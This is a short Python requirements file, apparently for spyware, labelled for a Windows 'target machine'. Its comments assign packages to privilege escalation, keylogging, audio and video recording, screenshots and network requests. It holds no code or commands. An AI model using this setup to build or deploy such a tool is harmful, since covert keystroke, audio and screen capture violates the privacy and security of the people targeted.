# Requirements for TARGET MACHINE (Windows with Python 3.4.3)

# Windows API access (required for privilege escalation and window detection)
pywin32>=223

# Cross-platform keylogger (Python 3.4.3 compatible)
pynput>=1.6.0,<1.7.0

# Audio recording (Python 3.4.3 compatible) 
PyAudio>=0.2.7,<0.3.0

# Video recording and screenshots (Python 3.4.3 compatible)
opencv-python>=3.4.0,<4.0.0
Pillow>=3.4.0,<6.0.0  
PyAutoGUI>=0.9.30,<0.10.0
numpy>=1.11.0,<1.17.0

# System utilities (Python 3.4.3 compatible)
psutil>=5.0.0,<6.0.0

# Network requests (Python 3.4.3 compatible)
requests>=2.18.0,<2.25.0